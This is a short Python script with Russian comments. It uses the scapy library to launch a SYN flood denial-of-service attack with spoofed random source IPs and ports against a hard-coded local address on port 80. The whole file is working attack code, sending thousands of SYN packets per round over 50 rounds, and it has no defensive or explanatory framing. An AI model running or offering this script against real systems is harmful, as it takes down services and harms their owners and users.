import threading
import time

import requests
from scapy.all import IP, TCP, send
import random
from tqdm import tqdm


# Функция для отправки SYN-пакетов
def syn_flood(target_ip, target_port):
    # Генерация случайного исходного порта и IP.
    src_port = random.randint(1024, 65535)
    src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    for _ in range(random.randint(1000, 3000)):
        # Создание IP и TCP-пакета
        packet = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")

        # Отправка пакета.
        send(packet, verbose=False)


def make_syn_flood_attack():
    # Целевой IP и порт
    target_ip = "192.168.1.34"
    target_port = 80
    n_attacks = 50

    for _ in tqdm(range(n_attacks)):
        syn_flood(target_ip, target_port)


# Запуск SYN Flood.
make_syn_flood_attack()
